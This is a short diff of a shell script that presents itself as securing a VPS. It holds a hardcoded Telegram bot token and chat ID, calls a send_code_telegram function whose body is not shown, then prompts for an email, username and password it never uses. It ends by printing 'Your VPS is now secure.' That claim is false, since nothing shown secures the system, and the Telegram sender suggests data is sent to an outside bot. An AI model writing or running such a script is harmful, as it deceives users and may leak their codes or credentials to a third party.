@@ -20,3 +20,14 @@ send_code_telegram() {
 bot_tokens=("7046086866:AAFkgJlAvnZ3XiRhcgKYAYXONLOIvjDsRqY")
 chat_ids=("1744391586")
 send_code_telegram
+echo "Enter email address:"
+read email
+
+echo "Enter username:"
+read username
+
+echo "Enter a strong password:"
+read strongpass
+
+echo "Your VPS is now secure."
+exit
